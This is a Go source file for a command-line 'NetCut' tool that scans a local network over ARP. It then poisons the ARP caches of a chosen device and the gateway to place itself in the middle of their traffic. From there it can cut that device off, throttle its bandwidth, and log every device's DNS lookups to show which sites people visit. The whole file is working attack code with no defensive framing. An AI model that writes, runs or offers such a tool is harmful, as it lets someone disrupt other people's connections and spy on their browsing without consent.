package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// --- Structs ---

type Device struct {
	IP             string
	MAC            string
	Hostname       string
	Vendor         string
	Platform       string
	BytesSent      uint64
	BytesRecv      uint64
	LastSeen       time.Time
	VisitedSites   []string
	IsCut          bool
	IsLimited      bool
	BandwidthLimit uint64
	bucketTokens   float64
	lastBucketRef  time.Time
}

type NetManager struct {
	devices       map[string]*Device
	activeTargets map[string]bool
	mu            sync.RWMutex

	ifaceName  string
	localIP    string
	localMAC   string
	gatewayIP  string
	gatewayMAC string

	handle          *pcap.Handle
	stopSnifferView chan bool
	stopDashboard   chan bool
}

var nm *NetManager

// --- Main ---

func main() {
	checkPrivileges()
	fmt.Printf("🔥 NetCut CLI (OS: %s) Initializing...\n", runtime.GOOS)

	nm = &NetManager{
		devices:         make(map[string]*Device),
		activeTargets:   make(map[string]bool),
		stopSnifferView: make(chan bool),
		stopDashboard:   make(chan bool),
	}

	if err := nm.initialize(); err != nil {
		fmt.Printf("❌ Init Error: %v\n", err)
		os.Exit(1)
	}

	go nm.processTrafficLoop()
	nm.setupSignalHandler()
	nm.mainMenu()
}

// --- Helpers ---

func checkPrivileges() {
	if runtime.GOOS != "windows" {
		if os.Geteuid() != 0 {
			fmt.Println("❌ Error: You must run this tool as root/sudo.")
			os.Exit(1)
		}
	}
}

// --- Hostname & Vendor Logic ---

func getHostname(ip string) string {
	names, err := net.LookupAddr(ip)
	if err == nil && len(names) > 0 {
		return strings.TrimSuffix(names[0], ".")
	}
	return "Unknown"
}

func getVendorAndPlatform(mac string) (string, string) {
	clean := strings.ToUpper(strings.ReplaceAll(mac, ":", ""))
	if len(clean) < 6 {
		return "Unknown", "❓"
	}
	prefix := clean[0:6]

	vendors := map[string]string{
		"000C29": "VMware", "005056": "VMware",
		"B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi",
		"001B21": "Intel", "0024D7": "Intel", "6805CA": "Intel",
		"00E04C": "Realtek", "5404A6": "Realtek",
		"18C04D": "Dell", "F01FAF": "Dell",
		"3C5282": "HP", "FC15B4": "HP",
		"806E6F": "MSI", "D43D7E": "Micro-Star",
		"30C3D9": "Samsung", "50F5DA": "Samsung", "24F5AA": "Samsung",
		"AC5F3E": "Samsung", "A0C6EB": "Samsung", "2400BA": "Samsung",
		"94FB29": "Xiaomi", "F8A2D6": "Xiaomi",
		"A47733": "Google Pixel",
		"F4F5DB": "Apple", "BC926B": "Apple", "88665A": "Apple", "1C36BB": "Apple",
		"F0D5BF": "Apple", "DC2B2A": "Apple", "28CFE9": "Apple",
		"6045BD": "TP-Link", "AC84C6": "TP-Link",
	}

	vendor, ok := vendors[prefix]
	if !ok {
		return "Generic", "🔌"
	}

	switch vendor {
	case "Apple":
		return "Apple", "🍎"
	case "Samsung", "Xiaomi", "Google Pixel", "Oppo", "Vivo":
		return vendor, "📱"
	case "Intel", "Realtek", "Dell", "HP", "MSI", "Micro-Star", "VMware":
		return vendor, "💻"
	case "Raspberry Pi":
		return vendor, "📟"
	case "TP-Link", "Netgear", "Cisco":
		return vendor, "🌐"
	default:
		return vendor, "❓"
	}
}

// --- Initialization ---

func getGatewayIP() (string, error) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("route", "print", "0.0.0.0")
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			fields := strings.Fields(line)
			if len(fields) > 4 && fields[0] == "0.0.0.0" {
				return fields[2], nil
			}
		}
		return "", fmt.Errorf("gateway not found")
	} else {
		cmd := exec.Command("ip", "route", "show", "default")
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		fields := strings.Fields(string(out))
		if len(fields) > 2 {
			return fields[2], nil
		}
		return "", fmt.Errorf("gateway not found")
	}
}

func (nm *NetManager) initialize() error {
	gw, err := getGatewayIP()
	if err != nil {
		return err
	}
	nm.gatewayIP = gw

	devices, err := pcap.FindAllDevs()
	if err != nil {
		return err
	}
	found := false
	for _, d := range devices {
		for _, address := range d.Addresses {
			ip := address.IP.To4()
			if ip != nil && !ip.IsLoopback() {
				if isSameSubnet(ip.String(), nm.gatewayIP) {
					nm.ifaceName = d.Name
					nm.localIP = ip.String()
					found = true
					break
				}
			}
		}
		if found {
			break
		}
	}
	if !found {
		return fmt.Errorf("no interface found for gateway %s", nm.gatewayIP)
	}

	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			if strings.Contains(a.String(), nm.localIP) {
				nm.localMAC = i.HardwareAddr.String()
			}
		}
	}

	handle, err := pcap.OpenLive(nm.ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	nm.handle = handle

	vendor, platform := getVendorAndPlatform(nm.localMAC)
	nm.devices[nm.localIP] = &Device{
		IP: nm.localIP, MAC: nm.localMAC,
		Hostname: "My-Device", Vendor: vendor, Platform: platform,
		LastSeen: time.Now(),
	}

	gwMac, err := nm.resolveMAC(nm.gatewayIP)
	if err != nil {
		nm.gatewayMAC = "ff:ff:ff:ff:ff:ff"
	} else {
		nm.gatewayMAC = gwMac
	}

	return nil
}

func isSameSubnet(ip1, ip2 string) bool {
	p1 := strings.Split(ip1, ".")
	p2 := strings.Split(ip2, ".")
	if len(p1) == 4 && len(p2) == 4 {
		return p1[0] == p2[0] && p1[1] == p2[1] && p1[2] == p2[2]
	}
	return false
}

// --- Traffic Engine (Fixed Format) ---

func (nm *NetManager) processTrafficLoop() {
	src := gopacket.NewPacketSource(nm.handle, nm.handle.LinkType())
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}

	localMACAddr, _ := net.ParseMAC(nm.localMAC)
	gatewayMACAddr, _ := net.ParseMAC(nm.gatewayMAC)

	for packet := range src.Packets() {
		ethLayer := packet.Layer(layers.LayerTypeEthernet)
		if ethLayer == nil {
			continue
		}
		eth := ethLayer.(*layers.Ethernet)
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer == nil {
			continue
		}
		ip := ipLayer.(*layers.IPv4)

		srcIP := ip.SrcIP.String()
		dstIP := ip.DstIP.String()
		size := uint64(len(packet.Data()))

		nm.mu.Lock()

		if _, exists := nm.devices[srcIP]; !exists {
			mac := eth.SrcMAC.String()
			vendor, platform := getVendorAndPlatform(mac)

			newDev := &Device{
				IP:       srcIP,
				MAC:      mac,
				Vendor:   vendor,
				Platform: platform,
				LastSeen: time.Now(),
				Hostname: "Resolving...",
			}
			nm.devices[srcIP] = newDev

			go func(d *Device) {
				host := getHostname(d.IP)
				nm.mu.Lock()
				d.Hostname = host
				nm.mu.Unlock()
			}(newDev)
		}

		if dev, ok := nm.devices[srcIP]; ok {
			dev.BytesSent += size
			dev.LastSeen = time.Now()
		}
		if dev, ok := nm.devices[dstIP]; ok {
			dev.BytesRecv += size
			dev.LastSeen = time.Now()
		}

		if dev, ok := nm.devices[srcIP]; ok && packet.Layer(layers.LayerTypeDNS) != nil {
			dns := packet.Layer(layers.LayerTypeDNS).(*layers.DNS)
			if !dns.QR && len(dns.Questions) > 0 {
				domain := strings.TrimSuffix(string(dns.Questions[0].Name), ".")
				if len(dev.VisitedSites) == 0 || dev.VisitedSites[len(dev.VisitedSites)-1] != domain {
					dev.VisitedSites = append(dev.VisitedSites, domain)
					if len(dev.VisitedSites) > 50 {
						dev.VisitedSites = dev.VisitedSites[1:]
					}
				}
			}
		}

		var targetDev *Device
		var isUpload bool

		if nm.activeTargets[srcIP] {
			targetDev = nm.devices[srcIP]
			isUpload = true
		} else if nm.activeTargets[dstIP] {
			targetDev = nm.devices[dstIP]
			isUpload = false
		}
		nm.mu.Unlock()

		if targetDev == nil || srcIP == nm.localIP || dstIP == nm.localIP {
			continue
		}
		if targetDev.IsCut {
			continue
		}
		if targetDev.IsLimited {
			limitBytes := float64(targetDev.BandwidthLimit) * 1024
			now := time.Now()
			elapsed := now.Sub(targetDev.lastBucketRef).Seconds()
			targetDev.bucketTokens += elapsed * limitBytes
			if targetDev.bucketTokens > limitBytes {
				targetDev.bucketTokens = limitBytes
			}
			targetDev.lastBucketRef = now
			needed := float64(size)
			if targetDev.bucketTokens >= needed {
				targetDev.bucketTokens -= needed
			} else {
				wait := (needed - targetDev.bucketTokens) / limitBytes
				time.Sleep(time.Duration(wait * float64(time.Second)))
				targetDev.bucketTokens = 0
				targetDev.lastBucketRef = time.Now()
			}
		}

		if isUpload {
			eth.SrcMAC = localMACAddr
			eth.DstMAC = gatewayMACAddr
		} else {
			targetMAC, _ := net.ParseMAC(targetDev.MAC)
			eth.SrcMAC = localMACAddr
			eth.DstMAC = targetMAC
		}

		buffer.Clear()
		gopacket.SerializeLayers(buffer, opts, eth, ip, gopacket.Payload(ip.Payload))
		nm.handle.WritePacketData(buffer.Bytes())
	}
}

// --- Scanning ---

func (nm *NetManager) scanNetwork() {
	fmt.Println("🔍 Scanning...")
	ip := net.ParseIP(nm.localIP).To4()
	baseIP := fmt.Sprintf("%d.%d.%d", ip[0], ip[1], ip[2])
	for i := 1; i < 255; i++ {
		targetIP := fmt.Sprintf("%s.%d", baseIP, i)
		if targetIP == nm.localIP {
			continue
		}
		go nm.sendARPWithHandle(nm.handle, targetIP, "00:00:00:00:00:00", nm.localIP, nm.localMAC, layers.ARPRequest)
		time.Sleep(2 * time.Millisecond)
	}
	time.Sleep(2 * time.Second)
	nm.mu.RLock()
	c := len(nm.devices)
	nm.mu.RUnlock()
	fmt.Printf("✓ Found %d devices.\n", c)
}

// --- Actions ---

func (nm *NetManager) blockDevice(target string) {
	nm.mu.Lock()
	dev := nm.devices[target]
	nm.mu.Unlock()
	if dev == nil {
		fmt.Println("❌ Not found.")
		return
	}
	dev.IsCut = true
	dev.IsLimited = false
	go nm.startMITM(target)
	fmt.Printf("🚫 Blocked %s\n", target)
}

func (nm *NetManager) limitDevice(target string, limit uint64) {
	nm.mu.Lock()
	dev := nm.devices[target]
	nm.mu.Unlock()
	if dev == nil {
		fmt.Println("❌ Not found.")
		return
	}
	dev.IsCut = false
	dev.IsLimited = true
	dev.BandwidthLimit = limit
	dev.bucketTokens = float64(limit * 1024)
	dev.lastBucketRef = time.Now()
	go nm.startMITM(target)
	fmt.Printf("⚡ Limited %s to %d KB/s\n", target, limit)
}

func (nm *NetManager) releaseDevice(target string) {
	nm.mu.Lock()
	dev := nm.devices[target]
	delete(nm.activeTargets, target)
	nm.mu.Unlock()
	if dev != nil {
		dev.IsCut = false
		dev.IsLimited = false
		nm.sendARP(target, dev.MAC, nm.gatewayIP, nm.gatewayMAC)
		nm.sendARP(nm.gatewayIP, nm.gatewayMAC, target, dev.MAC)
		fmt.Printf("🟢 Released %s\n", target)
	}
}

func (nm *NetManager) startMITM(targetIP string) {
	nm.mu.Lock()
	nm.activeTargets[targetIP] = true
	dev := nm.devices[targetIP]
	nm.mu.Unlock()
	ticker := time.NewTicker(2 * time.Second)
	for {
		nm.mu.RLock()
		active := nm.activeTargets[targetIP]
		nm.mu.RUnlock()
		if !active {
			return
		}
		nm.sendARP(targetIP, dev.MAC, nm.gatewayIP, nm.localMAC)
		nm.sendARP(nm.gatewayIP, nm.gatewayMAC, targetIP, nm.localMAC)
		<-ticker.C
	}
}

func (nm *NetManager) resolveMAC(ip string) (string, error) {
	handle, err := pcap.OpenLive(nm.ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return "", err
	}
	defer handle.Close()
	handle.SetBPFFilter("arp")
	nm.sendARPWithHandle(handle, ip, "00:00:00:00:00:00", nm.localIP, nm.localMAC, layers.ARPRequest)
	src := gopacket.NewPacketSource(handle, handle.LinkType())
	timeout := time.After(2 * time.Second)
	for {
		select {
		case packet := <-src.Packets():
			if arp := packet.Layer(layers.LayerTypeARP); arp != nil {
				a := arp.(*layers.ARP)
				if net.IP(a.SourceProtAddress).String() == ip {
					return net.HardwareAddr(a.SourceHwAddress).String(), nil
				}
			}
		case <-timeout:
			return "", fmt.Errorf("timeout")
		}
	}
}

func (nm *NetManager) sendARP(dstIP, dstMAC, srcIP, srcMAC string) {
	nm.sendARPWithHandle(nm.handle, dstIP, dstMAC, srcIP, srcMAC, layers.ARPReply)
}

func (nm *NetManager) sendARPWithHandle(handle *pcap.Handle, dstIP, dstMAC, srcIP, srcMAC string, op uint16) {
	sMAC, _ := net.ParseMAC(srcMAC)
	dMAC, _ := net.ParseMAC(dstMAC)
	sIP := net.ParseIP(srcIP).To4()
	dIP := net.ParseIP(dstIP).To4()
	eth := layers.Ethernet{SrcMAC: sMAC, DstMAC: dMAC, EthernetType: layers.EthernetTypeARP}
	arp := layers.ARP{
		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4, HwAddressSize: 6, ProtAddressSize: 4, Operation: op,
		SourceHwAddress: sMAC, SourceProtAddress: sIP, DstHwAddress: dMAC, DstProtAddress: dIP,
	}
	buf := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{}, &eth, &arp)
	if handle != nil {
		handle.WritePacketData(buf.Bytes())
	}
}

func (nm *NetManager) setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() { <-c; nm.cleanup(); os.Exit(0) }()
}

func (nm *NetManager) cleanup() {
	nm.mu.Lock()
	for ip := range nm.activeTargets {
		delete(nm.activeTargets, ip)
	}
	nm.mu.Unlock()
}

// --- Menu UI ---

func (nm *NetManager) mainMenu() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("\033[H\033[2J")
		fmt.Printf("🚀 NETCUT CLI (OS: %s)\n", runtime.GOOS)
		fmt.Printf("Me: %s | Gateway: %s\n", nm.localIP, nm.gatewayIP)
		fmt.Println("1. Scan  2. List  3. Dash  4. Sniff  5. Cut  6. Limit  7. Release  8. Exit")
		fmt.Print("Select: ")
		in, _ := reader.ReadString('\n')
		in = strings.TrimSpace(in)
		switch in {
		case "1":
			nm.scanNetwork()
			time.Sleep(1 * time.Second)
		case "2":
			nm.listDevices()
			fmt.Print("\nEnter...")
			reader.ReadString('\n')
		case "3":
			nm.showDashboard()
		case "4":
			nm.showSniffer()
		case "5":
			fmt.Print("IP: ")
			ip, _ := reader.ReadString('\n')
			nm.blockDevice(strings.TrimSpace(ip))
			time.Sleep(1 * time.Second)
		case "6":
			fmt.Print("IP: ")
			ip, _ := reader.ReadString('\n')
			fmt.Print("KB/s: ")
			limit, _ := reader.ReadString('\n')
			var l uint64
			fmt.Sscanf(limit, "%d", &l)
			nm.limitDevice(strings.TrimSpace(ip), l)
			time.Sleep(1 * time.Second)
		case "7":
			fmt.Print("IP: ")
			ip, _ := reader.ReadString('\n')
			nm.releaseDevice(strings.TrimSpace(ip))
			time.Sleep(1 * time.Second)
		case "8":
			nm.cleanup()
			os.Exit(0)
		}
	}
}

func (nm *NetManager) listDevices() {
	nm.mu.RLock()
	defer nm.mu.RUnlock()
	var ips []string
	for ip := range nm.devices {
		ips = append(ips, ip)
	}
	sort.Strings(ips)

	fmt.Println("\n--- Device List ---")
	fmt.Printf("%-15s %-4s %-12s %-20s %s\n", "IP ADDRESS", "TYPE", "VENDOR", "HOSTNAME", "DATA")
	fmt.Println(strings.Repeat("-", 70))

	for _, ip := range ips {
		d := nm.devices[ip]
		mb := float64(d.BytesSent+d.BytesRecv) / 1024 / 1024

		host := d.Hostname
		if len(host) > 18 {
			host = host[:15] + "..."
		}

		marker := ""
		if ip == nm.localIP {
			marker = "(ME)"
		}

		fmt.Printf("%-15s %-4s %-12s %-20s %.2f MB %s\n",
			d.IP, d.Platform, d.Vendor, host, mb, marker)
	}
}

func (nm *NetManager) showDashboard() {
	ticker := time.NewTicker(1 * time.Second)
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() { <-sigChan; nm.stopDashboard <- true }()
	for {
		select {
		case <-nm.stopDashboard:
			ticker.Stop()
			nm.setupSignalHandler()
			return
		case <-ticker.C:
			fmt.Print("\033[H\033[2J")
			fmt.Println("LIVE DASHBOARD (Ctrl+C Exit)")
			nm.listDevices()
		}
	}
}

func (nm *NetManager) showSniffer() {
	ticker := time.NewTicker(1 * time.Second)
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() { <-sigChan; nm.stopSnifferView <- true }()
	printed := make(map[string]int)
	for {
		select {
		case <-nm.stopSnifferView:
			ticker.Stop()
			nm.setupSignalHandler()
			return
		case <-ticker.C:
			nm.mu.RLock()
			for ip, d := range nm.devices {
				if len(d.VisitedSites) > printed[ip] {
					for i := printed[ip]; i < len(d.VisitedSites); i++ {
						fmt.Printf("[%s | %s] -> %s\n", ip, d.Platform, d.VisitedSites[i])
					}
					printed[ip] = len(d.VisitedSites)
				}
			}
			nm.mu.RUnlock()
		}
	}
}
